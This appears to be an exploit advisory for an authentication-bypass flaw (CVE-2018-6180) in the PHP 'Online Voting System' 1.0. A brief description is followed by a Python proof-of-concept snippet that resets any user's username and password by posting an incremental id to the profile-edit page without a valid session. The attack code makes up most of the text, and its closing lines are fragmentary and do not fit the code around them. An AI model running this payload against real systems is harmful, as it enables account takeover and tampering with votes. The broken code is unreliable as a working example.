# Exploit Title: Online Voting System - Authentication Bypass
# Date: 02.02.2018
# Vendor Homepage: http://themashabrand.com
# Software Link: http://themashabrand.com/p/votin
# Demo: http://localhost/Onlinevoting
# Version: 1.0
# Category: Webapps
# Exploit Author: Giulio Comi
# CVE : CVE-2018-6180


#Description

A flaw in the profile section of Online Voting System allows an unauthenticated user to set an arbitrary password for accounts registered in the application.

The application does not check the validity of the session cookie and updates the password and other fields of a user based on an incremental identifier and without requiring the current valid password for target account.

    Reset the password of a user just knowing his id

    payload = {
               'id': 1,
               'admin': 'admin',  # overwrite the username of the victim
               'password': "ARBITRARY_PASSWORD", # overwrite the password of the victim
               'edit': ''
              }

    response = auth_bypass_request.post(target_site + url_edit_password, data=payload)

    # Parse response to check if the request was successful
    check_result = html.fromstring(response).xpath('//div[@class="alert alert-success"]//p//strong/text()')

    return(lambda: False, lambda: True)[str(check_result).find('Successfully') > -1]()

                   'login': ''
                  }
